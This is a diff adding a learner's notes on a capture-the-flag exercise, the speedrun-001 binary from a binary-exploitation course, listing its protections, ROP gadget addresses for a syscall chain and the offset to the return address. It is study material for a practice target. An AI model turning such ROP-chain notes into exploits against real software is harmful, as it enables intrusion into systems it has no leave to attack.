@@ -103,6 +103,26 @@
 
     There is a `free` on the way to the overwrite but we can give it a null pointer.
 
+* [speedrun-001](https://github.com/guyinatuxedo/nightmare/blob/master/modules/07-bof_static/dcquals19_speedrun1/speedrun-001)
+    At this moment I realized... that the executable are just on this course's github!
+    Anyway:
+    64bit
+    RELRO & NX
+    
+    0x004498a0 seems to read input with a syscall, so ROP with it as before:
+    rax: `0x0000000000415664 : pop rax ; ret`
+    rdi: `0x0000000000400686 : pop rdi ; ret`
+    rsi: `0x00000000004101f3 : pop rsi ; ret`
+    rdx: `0x00000000004498b5 : pop rdx ; ret`
+    mov: `0x000000000048d251 : mov qword ptr [rax], rdx ; ret`
+    syscall: `0x000000000040129c : syscall`
+    heap seems empty: 0x006bc000
+    location of stack: 0x7fffffffd830
+    rip: 0x7fffffffdc38
+        -> diff of 0x408
+
+    note to self: `/bin/bash` **does not work** (at least for this one)
+
 # Notes
 
 ## Defence
